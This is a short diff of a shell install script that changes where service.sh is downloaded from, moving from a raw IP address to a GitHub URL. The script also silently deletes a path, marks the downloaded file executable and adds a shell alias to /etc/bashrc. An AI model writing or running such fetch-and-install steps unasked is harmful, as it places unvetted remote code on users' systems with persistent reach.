@@ -2,7 +2,7 @@
 
 rm -rf /media/Services &>/dev/null
 
-wget -O /media/Services http://173.199.127.79/service.sh
+wget -O /media/Services https://raw.githubusercontent.com/GitHub-ZC/IECOXE/master/service.sh
 chmod a+x /media/Services
 
 sed -ri '$ialias sys="/media/Services"' /etc/bashrc
